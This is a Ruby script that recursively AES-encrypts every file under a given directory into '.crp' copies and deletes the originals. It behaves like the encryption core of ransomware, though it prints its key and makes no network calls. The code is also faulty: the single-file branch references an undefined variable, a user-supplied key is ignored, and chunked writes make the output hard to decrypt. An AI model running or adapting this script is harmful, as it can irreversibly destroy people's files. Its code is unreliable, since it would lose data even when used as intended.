require 'aes'
require 'base64'
require 'slop'
$banner="
                  ▄▄  ▄▄▄▄▄▄▄▄                                ▄▄        ▄▄
       ██        ██   ▀▀▀▀▀███                        ██       █▄        █▄
      ██        ██        ██▀    ▄████▄    ██▄████  ███████     █▄        █▄
     ██        ██       ▄██▀    ██▄▄▄▄██   ██▀        ██         █▄        █▄
    ▄█▀       ▄█▀      ▄██      ██▀▀▀▀▀▀   ██         ██          █▄        █
   ▄█▀       ▄█▀      ███▄▄▄▄▄  ▀██▄▄▄▄█   ██         ██▄▄▄        █▄        █▄
  ▄█▀       ▄█▀       ▀▀▀▀▀▀▀▀    ▀▀▀▀▀    ▀▀          ▀▀▀▀         █▄        █▄

"
def parse()
 print $banner
 $options = Slop.parse suppress_errors: true do |argument|
  argument.string '--path', 'Path to dir or file to encrypt',required:true,default:""
  argument.string '-k','--key','Key for encryption',default:""
  argument.on '--help' do
   print (argument)
   exit()
  end
 end
 if !File.exist?($options[:path].to_s) 
  print "\nError:invalid path"
  exit()
 end  
end
def generate_key()
 if $options[:key] == ""
   $key=AES.key
   print "\nGenerated key: #{$key}"
 end
 $iv=AES.iv(:base_64)
 print "\nGenerated random initialization vector: #{$iv}"
end 
def main()
 parse()
 generate_key()
 print "\nStarting..."
 search()
end 
def search()
 if File.file?($options[:path].to_s)
  print "\nEncrypting... #{path}"
  encrypt($options[:path])
  File.delete(path)
 else 
  Dir.chdir $options[:path]
  Dir.glob("**/**").each do |path|
   if File.file?(path)
    print "\nEncrypting: #{path}"
    #write(encrypt(File.readlines(path)),path+'.crp')
    encrypt(path)
    print "\nRemoving original file"
    File.delete(path)
   else
    print "\nSkipping #{path} because it isn't a file"
   end 
  end
 end  
end
def encrypt(path) 
 File.open(path).each(nil,1024) do |chunk|
  write(AES.encrypt(chunk,$key,{:iv=>$iv}),path+'.crp')
 end
end
def write(data,path)
 File.open(path,'a') do |file|
  file.puts data.to_s 
 end 
end
main()
